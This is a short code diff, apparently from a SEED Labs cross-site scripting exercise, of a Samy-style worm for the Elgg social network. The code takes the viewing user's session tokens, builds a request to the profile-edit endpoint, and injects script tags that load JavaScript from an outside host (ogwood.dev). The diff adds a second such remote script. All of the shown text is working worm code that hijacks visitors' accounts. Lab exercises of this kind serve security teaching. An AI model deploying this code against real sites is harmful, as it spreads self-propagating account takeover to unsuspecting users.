@@ -6,7 +6,7 @@
  var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token="&__elgg_token="+elgg.security.token.__elgg_token;
  //Constructthecontentofyoururl.
- var js="<script type='text/javascript' src='https://www.ogwood.dev/seed2.js'></script>"; //FILLIN
+ var js="<script type='text/javascript' src='https://www.ogwood.dev/seed2.js'></script><script type='text/javascript' src='https://www.ogwood.dev/seed.js'></script>"; //FILLIN
  var content=userName + guid + ts + token + "&briefdescription=" + js;
  var samyGuid=59; //FILLIN
  var sendurl="http://www.seed-server.com/action/profile/edit"; //FILLIN
